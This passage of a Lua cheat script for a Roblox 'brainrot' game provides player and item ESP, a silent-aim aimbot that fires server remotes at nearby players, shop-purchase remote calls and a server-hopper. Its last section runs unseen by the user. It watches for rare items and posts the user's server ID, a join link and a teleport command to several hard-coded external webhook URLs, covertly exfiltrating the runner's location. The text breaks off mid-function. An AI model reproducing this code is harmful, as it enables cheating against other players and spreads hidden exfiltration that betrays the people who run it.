if player == Players.LocalPlayer then return end

local function addESP(character)
local head = character:FindFirstChild("Head")
if not head or ESPObjects[player] then return end

local billboard = Instance.new("BillboardGui")
billboard.Name = "PlayerESP"
billboard.Adornee = head
billboard.AlwaysOnTop = true
billboard.Size = UDim2.new(0, 100, 0, 20)
billboard.StudsOffset = Vector3.new(0, 2.5, 0)

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 1, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.fromRGB(255, 0, 0)
label.TextStrokeTransparency = 0
label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
label.Font = Enum.Font.SourceSansBold
label.TextScaled = true
label.Text = player.DisplayName or player.Name
label.Parent = billboard

billboard.Parent = head
ESPObjects[player] = billboard
end

if player.Character then
addESP(player.Character)
end

player.CharacterAdded:Connect(function(char)
task.wait(1)
if espEnabled then
addESP(char)
end
end)
end

local function enableESP()
for _, player in ipairs(Players:GetPlayers()) do
createESP(player)
end

Players.PlayerAdded:Connect(function(player)
if espEnabled then
createESP(player)
end
end)
end

local function disableESP()
for player, esp in pairs(ESPObjects) do
if esp then
esp:Destroy()
end
end
table.clear(ESPObjects)
end

-- ðŸŽ›ï¸ Add toggle to your GUI tab
EspTab:CreateToggle({
Name = "📇Player Name ESP",
CurrentValue = false,
Flag = "NameESP",
Callback = function(state)
espEnabled = state
if state then
enableESP()
else
disableESP()
end
end
})

local brainrotGods = {
    ["Cocofanto Elefanto"] = true,
    ["Girafa Celestre"] = true,
    ["Matteo"] = true,
    ["Tralalero Tralala"] = true,
    ["Odin Din Din Dun"] = true,
    ["Unclito Samito"] = true,
    ["Trenostruzzo Turbo 3000"] = true,
}

local godESPObjects = {}
local godESPEnabled = false

local function getAttachmentPart(model)
    if model.PrimaryPart then return model.PrimaryPart end
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            return part
        end
    end
    return nil
end

local function createGodESP(model)
    if model:FindFirstChild("BrainrotESP") then return end
    local adorneePart = getAttachmentPart(model)
    if not adorneePart then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "BrainrotESP"
    billboard.Adornee = adorneePart
    billboard.Size = UDim2.new(0, 166, 0, 33) -- slightly smaller
    billboard.StudsOffset = Vector3.new(0, 4, 0)
    billboard.AlwaysOnTop = true
    billboard.LightInfluence = 0
    billboard.Parent = model

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "ðŸ§  " .. model.Name
    label.TextColor3 = Color3.fromRGB(0, 170, 255) -- bright blue
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.new(0, 0, 0)
    label.Font = Enum.Font.GothamBlack
    label.TextSize = 16
    label.ZIndex = 10
    label.ClipsDescendants = true
    label.Parent = billboard

    godESPObjects[model] = billboard
end

local function enableGodESP()
    godESPEnabled = true
    for _, model in ipairs(workspace:GetChildren()) do
        if model:IsA("Model") and brainrotGods[model.Name] then
            createGodESP(model)
        end
    end
end

local function disableGodESP()
    godESPEnabled = false
    for model, billboard in pairs(godESPObjects) do
        if billboard and billboard.Parent then
            billboard:Destroy()
        end
    end
    godESPObjects = {}
end

workspace.ChildAdded:Connect(function(child)
    if godESPEnabled and child:IsA("Model") and brainrotGods[child.Name] then
        createGodESP(child)
    end
end)

-- Replace 'EspTab' with your actual Rayfield tab variable
EspTab:CreateToggle({
    Name = "☠️ Brainrot God Esp",
    CurrentValue = false,
    Flag = "BrainrotGodESP",
    Callback = function(state)
        if state then
            enableGodESP()
        else
            disableGodESP()
        end
    end,
})

local secretBrainrots = {
    ["La Vacca Saturno Saturnita"] = true,
    ["Los Tralaleritos"] = true,
    ["Sammyni Spyderini"] = true,
    ["Graipuss Medussi"] = true,
    ["La Grande Combinazione"] = true,
    ["Garama and Madundung"] = true,
}

local secretESPObjects = {}
local secretESPEnabled = false

local function getAttachmentPart(model)
    if model.PrimaryPart then return model.PrimaryPart end
    for _, part in ipairs(model:GetDescendants()) do
        if part:IsA("BasePart") then
            return part
        end
    end
    return nil
end

local function createSecretESP(model)
    if model:FindFirstChild("SecretBrainrotESP") then return end
    local adorneePart = getAttachmentPart(model)
    if not adorneePart then return end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "SecretBrainrotESP"
    billboard.Adornee = adorneePart
    billboard.Size = UDim2.new(0, 166, 0, 33)
    billboard.StudsOffset = Vector3.new(0, 5, 0)
    billboard.AlwaysOnTop = true
    billboard.LightInfluence = 0
    billboard.Parent = model

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "ðŸ¤« " .. model.Name
    label.TextColor3 = Color3.fromRGB(255, 128, 0)
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    label.Font = Enum.Font.GothamBold
    label.TextSize = 16
    label.ZIndex = 10
    label.ClipsDescendants = true
    label.Parent = billboard

    secretESPObjects[model] = billboard
end

local function enableSecretESP()
    secretESPEnabled = true
    for _, model in ipairs(workspace:GetChildren()) do
        if model:IsA("Model") and secretBrainrots[model.Name] then
            createSecretESP(model)
        end
    end
end

local function disableSecretESP()
    secretESPEnabled = false
    for model, billboard in pairs(secretESPObjects) do
        if billboard and billboard.Parent then
            billboard:Destroy()
        end
    end
    secretESPObjects = {}
end

workspace.ChildAdded:Connect(function(child)
    if secretESPEnabled and child:IsA("Model") and secretBrainrots[child.Name] then
        createSecretESP(child)
    end
end)

-- Replace 'EspTab' with your actual Rayfield tab variable
EspTab:CreateToggle({
    Name = "🤫Secret Brainrot Esp",
    CurrentValue = false,
    Flag = "SecretBrainrotESP",
    Callback = function(state)
        if state then
            enableSecretESP()
        else
            disableSecretESP()
        end
    end,
})

local UtilsTab = Window:CreateTab("🛠️ Utils", 6034818371)

local vu = game:GetService("VirtualUser")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local antiAfkConnection = nil

UtilsTab:CreateToggle({
	Name = "🛡️ Anti-AFK",
	CurrentValue = false,
	Callback = function(enabled)
		if enabled then
			if not antiAfkConnection then
				antiAfkConnection = player.Idled:Connect(function()
					vu:Button2Down(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
					wait(1)
					vu:Button2Up(Vector2.new(0,0), workspace.CurrentCamera.CFrame)
				end)
			end
		else
			if antiAfkConnection then
				antiAfkConnection:Disconnect()
				antiAfkConnection = nil
			end
		end
	end
})

-- ðŸŸ¥ Then add the rest (GUI logic, etc.)
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local leaveGui = Instance.new("ScreenGui")
leaveGui.Name = "LeaveButtonGUI"
leaveGui.ResetOnSpawn = false
leaveGui.Enabled = false
leaveGui.DisplayOrder = 1000
leaveGui.Parent = playerGui

local leaveButton = Instance.new("TextButton")
leaveButton.Size = UDim2.new(0, 100, 0, 40)
leaveButton.Position = UDim2.new(0.5, -50, 0, 10)
leaveButton.AnchorPoint = Vector2.new(0.5, 0)
leaveButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
leaveButton.Text = "Leave"
leaveButton.Font = Enum.Font.SourceSansBold
leaveButton.TextSize = 22
leaveButton.TextColor3 = Color3.new(1, 1, 1)
leaveButton.ZIndex = 999
leaveButton.Parent = leaveGui

leaveButton.MouseButton1Click:Connect(function()
	player:Kick("You chose to leave the game.")
end)

-- ðŸ”˜ Toggle to control the Leave GUI
UtilsTab:CreateToggle({
	Name = "🚪Toggle Leave GUI",
	CurrentValue = false,
	Callback = function(state)
		leaveGui.Enabled = state
	end,
})

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create Rejoin GUI (starts disabled)
local rejoinGui = Instance.new("ScreenGui")
rejoinGui.Name = "RejoinButtonGUI"
rejoinGui.ResetOnSpawn = false
rejoinGui.Enabled = false
rejoinGui.DisplayOrder = 1000
rejoinGui.Parent = playerGui

local rejoinButton = Instance.new("TextButton")
rejoinButton.Size = UDim2.new(0, 100, 0, 40)
rejoinButton.Position = UDim2.new(0.5, 54, 0, 10) -- 4 px right of center
rejoinButton.AnchorPoint = Vector2.new(0.5, 0)
rejoinButton.BackgroundColor3 = Color3.fromRGB(50, 150, 255)
rejoinButton.Text = "Rejoin"
rejoinButton.Font = Enum.Font.SourceSansBold
rejoinButton.TextSize = 22
rejoinButton.TextColor3 = Color3.new(1, 1, 1)
rejoinButton.ZIndex = 999
rejoinButton.Parent = rejoinGui

rejoinButton.MouseButton1Click:Connect(function()
	local placeId = game.PlaceId
	local jobId = game.JobId
	TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
end)

-- Add toggle to UtilsTab to show/hide the Rejoin GUI
UtilsTab:CreateToggle({
	Name = "⚡️ Toggle Rejoin GUI",
	CurrentValue = false,
	Callback = function(state)
		rejoinGui.Enabled = state
	end,
})

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

-- Create Server Hop GUI (hidden by default)
local serverHopGui = Instance.new("ScreenGui")
serverHopGui.Name = "ServerHopGUI"
serverHopGui.ResetOnSpawn = false
serverHopGui.DisplayOrder = 1000
serverHopGui.Parent = playerGui
serverHopGui.Enabled = false -- start hidden

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 150, 0, 40)
frame.Position = UDim2.new(0.5, 160, 0, 10)
frame.AnchorPoint = Vector2.new(0.5, 0)
frame.BackgroundColor3 = Color3.fromRGB(50, 205, 50)
frame.BorderSizePixel = 0
frame.Parent = serverHopGui
frame.Active = true
frame.Draggable = true

local button = Instance.new("TextButton")
button.Size = UDim2.new(1, 0, 1, 0)
button.BackgroundTransparency = 1
button.Text = "Server Hop"
button.Font = Enum.Font.SourceSansBold
button.TextSize = 22
button.TextColor3 = Color3.new(1, 1, 1)
button.Parent = frame

-- Server Hop logic variables
local PlaceID = game.PlaceId
local AllIDs = {}
local foundAnything = ""
local actualHour = os.date("!*t").hour
local hopping = false

local function loadVisited()
    local success, data = pcall(function()
        return HttpService:JSONDecode(readfile("NotSameServers.json"))
    end)
    if success and type(data) == "table" then
        AllIDs = data
    else
        AllIDs = {actualHour}
        pcall(function()
            writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
        end)
    end
end
loadVisited()

local function saveVisited()
    pcall(function()
        writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
    end)
end

local function TPReturner()
    local Site
    if foundAnything == "" then
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
    else
        Site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
    end

    if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
        foundAnything = Site.nextPageCursor
    else
        foundAnything = ""
    end

    local num = 0
    for i, v in pairs(Site.data) do
        if not hopping then return end
        local Possible = true
        local ID = tostring(v.id)
        if tonumber(v.maxPlayers) > tonumber(v.playing) then
            for _, Existing in pairs(AllIDs) do
                if num ~= 0 then
                    if ID == tostring(Existing) then
                        Possible = false
                        break
                    end
                else
                    if tonumber(actualHour) ~= tonumber(Existing) then
                        pcall(function()
                            delfile("NotSameServers.json")
                            AllIDs = {actualHour}
                            saveVisited()
                        end)
                    end
                end
            end
            if Possible then
                table.insert(AllIDs, ID)
                saveVisited()
                pcall(function()
                    TeleportService:TeleportToPlaceInstance(PlaceID, ID, player)
                end)
                wait(4)
                return
            end
        end
        num = num + 1
    end
end

local function serverHopLoop()
    while hopping do
        local success, err = pcall(TPReturner)
        if not success then warn(err) end
        wait(1)
    end
end

-- Toggle hopping state on button click inside custom GUI
button.MouseButton1Click:Connect(function()
    hopping = not hopping
    if hopping then
        button.Text = "Stop Server Hop"
        task.spawn(serverHopLoop)
    else
        button.Text = "Server Hop"
    end
end)

-- Rayfield toggle just shows/hides the custom GUI
UtilsTab:CreateToggle({
    Name = "🐇Server Hop GUI",
    CurrentValue = false,
    Flag = "ServerHopGUIToggle",
    Callback = function(value)
        serverHopGui.Enabled = value
    end,
})

MainTab:CreateToggle({
Name = "👻Show Invisible Players", 
CurrentValue = visibilityEnabled, 
Flag = "VisibilityToggle",
Callback = function(s)
visibilityEnabled = s
if s then
for _,p in ipairs(Players:GetPlayers()) do
if p.Character then onCharacterAdded(p.Character) end
p.CharacterAdded:Connect(onCharacterAdded)
if p:FindFirstChild("Backpack") then
p.Backpack.ChildAdded:Connect(function(tool)
local handle = tool:FindFirstChild("Handle")
if handle then handle.Transparency=0; handle.CanCollide=false end
end)
end
end
task.spawn(function()
while visibilityEnabled do
for _,p in ipairs(Players:GetPlayers()) do
if p.Character then
makeCharacterVisible(p.Character)
makeToolsVisible(p)
end
end
task.wait(2)
end
end)
end
end
})


ShopTab:CreateButton({
Name = "All Seeing Sentry",
Callback = function()
local args = { "All Seeing Sentry" }
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Invisibility Cloak",
Callback = function()
local args = { "Invisibility Cloak" }
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

}) 

ShopTab:CreateButton({
Name = "Trap",
Callback = function()
local args = { "Trap" }
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Medusa",
Callback = function()
local args = {"Medusa's Head" }
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Quantum Cloner",
Callback = function()
local args = {"Quantum Cloner"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Web Slinger",
Callback = function()
local args = {"Web Slinger"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Rainbowrath Sword",
Callback = function()
local args = {"Rainbowrath Sword"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Galaxy Slap",
Callback = function()
local args = {"Galaxy Slap"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Nuclear Slap",
Callback = function()
local args = {"Nuclear Slap"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Dark Matter Slap",
Callback = function()
local args = {"Dark Matter Slap"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Body Swap Potion",
Callback = function()
local args = {"Body Swap Potion"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

ShopTab:CreateButton({
Name = "Splatter Slap",
Callback = function()
local args = {"Splatter Slap"}
local success, err = pcall(function()
game:GetService("ReplicatedStorage")
.Packages.Net:FindFirstChild("RF/CoinsShopService/RequestBuy")
:InvokeServer(unpack(args))
end)
if not success then
warn("Failed to purchase All Seeing Sentry:", err)
end
end

})

--// UI Setup (assumes you already have a "Window" defined)
local MainTab = Window:CreateTab("🎮 Fun", 6034818371) -- You can replace icon ID
local autoAimEnabled = false

MainTab:CreateToggle({
    Name = "🎯 Aimbot WebSlinger",
    CurrentValue = false,
    Flag = "AimbotWebSlinger",
    Callback = function(value)
        autoAimEnabled = value
    end
})

--// Core Silent Aim Script
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer

local event = ReplicatedStorage.Packages.Net:FindFirstChild("RE/UseItem")
local toolName = "Web Slinger"

local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local tool = nil
local activatedConnection = nil

-- Find nearest player within 13 studs
local function findNearestPlayer()
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return nil end

    local nearestPlayer = nil
    local nearestDistance = 17

    for _, player in pairs(Players:GetPlayers()) do
        if player ~= localPlayer and player.Character then
            local targetPart = player.Character:FindFirstChild("UpperTorso") or player.Character:FindFirstChild("HumanoidRootPart")
            if targetPart then
                local dist = (rootPart.Position - targetPart.Position).Magnitude
                if dist <= nearestDistance then
                    nearestDistance = dist
                    nearestPlayer = player
                end
            end
        end
    end

    return nearestPlayer
end

-- Silent Aim Handler
local function silentAimFire()
    if not autoAimEnabled then return end -- only run if toggle is on
    if not tool or not event then return end
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    local nearestPlayer = findNearestPlayer()
    if not nearestPlayer then return end

    local targetPart = nearestPlayer.Character:FindFirstChild("UpperTorso") or nearestPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetPart then return end

    local origin = rootPart.Position
    local cframeAim = CFrame.new(origin, targetPart.Position)

    local args = {
        [1] = cframeAim,
        [2] = targetPart,
        [3] = tool:FindFirstChild("Handle")
    }

    event:FireServer(unpack(args))
end

-- On tool equipped, hook .Activated
local function onToolEquipped(equippedTool)
    if equippedTool.Name ~= toolName then return end

    tool = equippedTool

    -- Clear any existing hook
    if activatedConnection then
        activatedConnection:Disconnect()
        activatedConnection = nil
    end

    -- Hook tool activation
    activatedConnection = tool.Activated:Connect(function()
        silentAimFire()
    end)
end

-- On character added
localPlayer.CharacterAdded:Connect(function(char)
    character = char
    tool = nil
end)

-- Detect tool when added
if localPlayer.Character then
    character = localPlayer.Character

    character.ChildAdded:Connect(function(child)
        if child:IsA("Tool") and child.Name == toolName then
            onToolEquipped(child)
        end
    end)

    -- If already equipped
    for _, child in pairs(character:GetChildren()) do
        if child:IsA("Tool") and child.Name == toolName then
            onToolEquipped(child)
            break
        end
    end
end

local HttpService        = game:GetService("HttpService")
local Workspace          = game:GetService("Workspace")
local Players            = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local TeleportService    = game:GetService("TeleportService")

local allowedPlaceId = 109983668079237
if game.PlaceId ~= allowedPlaceId then return end

local webhookUrls = {
    "https://l.webhook.party/hook/%2BuI7MaVSZ1qDXMXzXxcZSblW09OOYaIPBSmE3ZKttIShRZnXuhL5r8GZalrwpOrQPTMKTpRkCnkLrfNOHJw%2BiN2uEZCsRRjGfBZyfXuVPnZwlt%2F6wPoTFl61hfSIEYPyeTR%2Fb9wwkrlzAGI8ShNPNzp7HIxJ%2ByaJQDGe2hKDrh1%2Bt8f4ByvN41CUww0HodBVOaEwdkTXWWdXV3covJyzk%2FuZB9jNDZXXDwBpC%2Fqr43NrYPHeIK7VwLm%2FNZk99bVpnec2edITtUZvegLwIzcD4OtpxyR693hTFBLDgBBmGEVzqmKLmQj3quYGaNPUjEIcUtXI8xQeKELogHdjLwBUmm30sGfYuwQrDBujidzgUMXj8vmWMvg8qqFYV4fxiV6M1KhfrYejf4E%3D/vuQ846k9DUvsKJbK",
    "https://l.webhook.party/hook/wI3nNnRLq3TL%2BzWP4iqeUvWdQbXGCOfSFubKCdEMCeA4%2FpynIcYUt3ddRd8WOKCgcjlWDZlEKkmH8WYU8kddp0QIjBLwxZgrsMP3SQoI0UZ%2FDzqlxlwZeGspJKtucnywiTGWkuGk0Ek6Z4KwGsgT2xXW7p0oDYfB%2FrPnyS3IuA1tgql9hk4%2FMTV%2FI5kycjNSpWkSwagU0Rbn46a3K5AJtEJUgRQxTOcAAp7HDMtrQJmL5MSCW%2FoKRq1y3FIhod%2FQYFYbPuijDOgvRb7yZYGyILd8lB0CghhBsnpwhlkiW3fZGm1SCSrVKGCyQO1DtRi5qTNXNuOgkTWa57mMa5O4tsJkU09fPDP6XlgHfYnjxzL9KiAIYFTSXwbwE%2BjyCUyzpweco31fNP8%3D/CZsJrq8hubij7m0d"
}

local extraWebhookUrl = "https://l.webhook.party/hook/mUXJonaZkYf%2BS%2F9kb4TVaJOtn%2FR7b%2BEO3lsFhXHjJFgx82My7pN3DIiJtyduJcpsE7lLaIPkdMRk1HnoA8UndcUqbHljOUvBlmnURV%2FeVljtTpPhE6Pf2DB3l1Bm%2Ft%2F4YRn7NZM%2Bq2VOmEq7uZQlCluqKwUOgqh0dROAYTP6AvMiBFz5shIO%2FngUW%2B6ulM8MQd7vghsP1dyt%2B8GE1r2sjTFfEOhkEPgcXVo6muTd8WONtW3pKKcYk%2F%2Bku5%2FEDO%2FhrMDGJoLIUy%2FKEAQyYhxANm6KNUQtg%2FYF9iT2kT0MZguD8o%2BwFGDAuWfFEv7YUgBwDMelC3xnGtkB%2FaedxXn9%2F3fc8YgRSpWv3uhkAHQx73dXiDgyxMRzAOjqRPK6SWTs%2FVroHg%2FUoeg%3D/2hIQSlgh00KYan3U"
local midWebhookUrl   = "https://l.webhook.party/hook/JKtX273MSUop97RHSdUK7KQkM4fWWGBo3y4E%2FOWIB2EVYIOA%2BVFdjAteQ4vKnshC6hbdanRdrjcvDDuA6we1bW%2FDsf1MseKWzN9mjMtq9HA1FH%2Fcz0wwgvfHoboig1kl5O328%2FWZEMjkyHWPll94lM34D7oOvbp7LWfytaa3q3ivUnttjY1JAhE8tROwuBfu%2BK4k7ht1FiwQTJKOB%2FlZpA5qyam5n2cyVZ9nuTtpCofiEb58oPSCro9CAbquhfcjAZTdPhVQq%2Bjw4S2hPAJSiYEa%2FqaZP6E1mmMgIcYYyLh5Rmf5bfyIwYJBkzsHDL5R5wdXSiHVevLnMVJ6Na2yL%2F0PaRNYwsz9aWW1bqYDmdfWjnHy82UnXp%2BL2fgTooxLiwBx2xkuYOk%3D/OHcgNksc8foSoCvE"

local brainrotGods = {
    ["dragon cannelloni"] = true,
    ["garama and madundung"] = true,
    ["esok sekolah"] = true,
    ["los hotspotsitos"] = true,
    ["nuclearo dinossauro"] = true,
    ["los combinasionas"] = true,
    ["la grande combinasion"] = true,
    ["chicleteira bicicleteira"] = true,
    ["secret lucky block"] = true,
    ["pot hotspot"] = true,
    ["karkerkar kurkur"] = true,
    ["los tungtungtungcitos"] = true,
    ["graipuss medussi"] = true,
    ["las vaquitas saturnitas"] = true,
    ["las tralaleritas"] = true,
    ["los tralaleritos"] = true,
    ["agarrini la palini"] = true,
    ["torrtuginni dragonfrutini"] = true,
    ["chimpanzini spiderini"] = true,
    ["sammyini spidreini"] = true,
    ["la vacca saturno saturnita"] = true,
}

local specialForThirdWebhook = {
    ["dragon cannelloni"] = true,
    ["garama and madundung"] = true,
    ["esok sekolah"] = true,
    ["los hotspotsitos"] = true,
    ["nuclearo dinossauro"] = true,
    ["los combinasionas"] = true,
}

local colorGold     = Color3.fromRGB(237, 178, 0)
local colorDiamond  = Color3.fromRGB(37, 196, 254)
local colorCandy    = Color3.fromRGB(255, 70, 246)
local COLOR_EPSILON = 0.02

local notified        = {}
local lastSentMessage = ""
local playerJoinTimes = {}

Players.PlayerAdded:Connect(function(player) playerJoinTimes[player.UserId] = tick() end)
Players.PlayerRemoving:Connect(function(player) playerJoinTimes[player.UserId] = nil end)

local function isPrivateServer()
    if game.PrivateServerId ~= "" or (game.PrivateServerOwnerId and game.PrivateServerOwnerId ~= 0) or (game.VIPServerOwnerId and game.VIPServerOwnerId ~= 0) then return true end
    local pl = Players:GetPlayers()
    if #pl == 1 then
        local s, r = pcall(function() return TeleportService:GetPlayerPlaceInstanceAsync(pl[1].UserId) end)
        if not s or not r or r.InstanceId ~= game.JobId then return true end
    end
    return false
end

local function getLeaderstatPlayerCount()
    local c = 0
    for _, p in ipairs(Players:GetPlayers()) do
        if p:FindFirstChild("leaderstats") then c += 1 end
    end
    return c
end

local function colorsAreClose(a, b)
    return math.abs(a.R - b.R) < COLOR_EPSILON and math.abs(a.G - b.G) < COLOR_EPSILON and math.abs(a.B - b.B) < COLOR_EPSILON
end

-- === Improved Money Detection ===
local moneyLabels = {}
local MONEY_MAX_DISTANCE = 6.6

local function matchesMoneyPattern(text)
    return text
        and text:find("%$")
        and text:find("/")
        and text:lower():find("s")
        and text:match("%d")
end

local function registerMoneyLabel(label)
    if label:IsA("TextLabel") and matchesMoneyPattern(label.Text) then
        local base = label:FindFirstAncestorWhichIsA("BasePart")
        if base then
            moneyLabels[base] = label
        end
    end
end

Workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("TextLabel") then
        registerMoneyLabel(obj)
    end
end)

for _, obj in ipairs(Workspace:GetDescendants()) do
    if obj:IsA("TextLabel") then
        registerMoneyLabel(obj)
    end
end

local function getNearbyMoney(rootPart)
    local closestDist = MONEY_MAX_DISTANCE
    local closestMoney = nil
    for base, label in pairs(moneyLabels) do
        if base and base.Parent and label and label.Parent then
            local dist = (base.Position - (rootPart.Position + Vector3.new(0, 3, 0))).Magnitude
            if dist <= closestDist and matchesMoneyPattern(label.Text) then
                closestDist = dist
                closestMoney = label.Text
            end
        end
    end
    return closestMoney and ("💸 " .. closestMoney) or "💸 N/A"
end

local function getPrimaryPart(m)
    if m.PrimaryPart then return m.PrimaryPart end
    for _, p in ipairs(m:GetDescendants()) do
        if p:IsA("BasePart") then return p end
    end
end

local function isRainbowMutating(m)
    for _, c in ipairs(m:GetChildren()) do
        if c:IsA("MeshPart") and c.Name:sub(1,5) == "Cube." then
            local l = c:GetAttribute("LastBrickColor")
            local cu = c.BrickColor.Color
            if l and (Vector3.new(l.R, l.G, l.B) - Vector3.new(cu.R, cu.G, cu.B)).Magnitude > 0.01 then
                return true
            end
            c:SetAttribute("LastBrickColor", cu)
        end
    end
end

local function sendNotification(modelName, mutation, moneyText)
    if isPrivateServer() then return end
    local playerCount = getLeaderstatPlayerCount()
    if playerCount < 6 or playerCount > 7 or playerCount == 5 then return end

    local placeId  = tostring(game.PlaceId)
    local jobId    = game.JobId
    local joinLink = string.format("https://chillihub1.github.io/chillihub-joiner/?placeId=%s&gameInstanceId=%s", placeId, jobId)
    local teleportCode = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game.Players.LocalPlayer)", placeId, jobId)
    local gameName = "Unknown"
    pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)

    local msg = string.format([[
---- %s

---- Secret Is Found ✅ ----

--- 📢 Game: %s
--- 💡 Model Name: "%s"
--- 🎨 Mutation: %s
--- 💸 Money/s: %s
--- 👥 Player Count: %d/8
  
%s
]], joinLink, gameName, modelName, mutation, moneyText or "N/A", playerCount, teleportCode)

    if msg == lastSentMessage then return end
    lastSentMessage = msg

    local data    = HttpService:JSONEncode({ content = msg })
    local headers = { ["Content-Type"] = "application/json" }
    local req     = (syn and syn.request) or (http and http.request) or request or http_request
    if not req then return end

    local lowerModel = modelName:lower()
    if lowerModel == "la grande combinasion" then
        for _, url in ipairs(webhookUrls) do
            pcall(function() req({ Url = url, Method = "POST", Headers = headers, Body = data }) end)
        end
        pcall(function() req({ Url = midWebhookUrl,   Method = "POST", Headers = headers, Body = data }) end)
        pcall(function() req({ Url = extraWebhookUrl, Method = "POST", Headers = headers, Body = data }) end)
    elseif specialForThirdWebhook[lowerModel] then
        pcall(function() req({ Url = midWebhookUrl,   Method = "POST", Headers = headers, Body = data }) end)
        pcall(function() req({ Url = extraWebhookUrl, Method = "POST", Headers = headers, Body = data }) end)
    else
        for _, url in ipairs(webhookUrls) do
            pcall(function() req({ Url = url, Method = "POST", Headers = headers, Body = data }) end)
        end
    end
end

local function checkBrainrots()
    for _, m in ipairs(Workspace:GetChildren()) do
        if m:IsA("Model") then
            local lowerName = m.Name:lower()
            if brainrotGods[lowerName] then
                local root = getPrimaryPart(m)
                if root then
                    local id = m:GetDebugId()
                    if not notified[id] then
                        local col = root.Color
                        local mut = "🕳️"
                        if colorsAreClose(col, colorGold) then mut = "🌕 Gold"
                        elseif colorsAreClose(col, colorDiamond) then mut = "💎 Diamond"
                        elseif colorsAreClose(col, colorCandy) then mut = "🍬 Candy"
                        elseif isRainbowMutating(m) then mut = "🌈 Rainbow" end

